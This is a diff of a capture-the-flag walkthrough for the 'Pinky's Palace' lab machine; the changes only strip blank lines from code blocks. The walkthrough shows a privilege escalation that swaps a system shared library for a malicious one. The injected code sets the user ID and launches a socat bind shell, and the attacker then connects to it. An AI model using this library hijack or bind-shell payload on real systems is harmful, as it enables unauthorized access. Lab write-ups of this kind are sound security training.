@@ -1163,15 +1163,10 @@ pinksec@pinkys-palace:/home/pinksec$ base64 -d libpinksec.bad.so.b64 > libpinkse
 Now we make a backup of the original and replace it with our one.
 
 ```
-
 pinksec@pinkys-palace:/home/pinksec$ cp /lib/libpinksec.so ./
-
 pinksec@pinkys-palace:/home/pinksec$ cp libpinksec.bad.so /lib/libpinksec.so
-
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd 
-
 bash-4.4$ whoami
-
 pinksec
 ```
 
@@ -1179,17 +1174,11 @@ Our exploit works but we did not inherit pinksecmanagment permissions.
 
 We fall back to running some commands directly in our exploit script:
 ```
-
 void psbanner()
-
 {
-
     setuid(1002);
-
     setgid(1002);
-
     system("whoami", NULL, NULL);
-
 }
 ```
 
@@ -1197,9 +1186,7 @@ Running this we get the expected output:
 
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd -d
-
 pinksecmanagement
-
 Soon to be host of pinksec web application.
 ```
 
@@ -1218,26 +1205,18 @@ pinksecmanagement
 
 ```
 void psbanner()
-
 {
-
     setuid(1002);
-
     setgid(1002);
-
     system("socat TCP-LISTEN:1339,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane", NULL, NULL);
-
 }
 ```
 
 Then we connect and are greeted with our bind shell.
 ```
 root@kali: socat FILE:`tty`,raw,echo=0 TCP:<target>:1339          
-
 sh: 0: can't access tty; job control turned off
-
 $ whoami
-
 pinksecmanagement
 ```
 
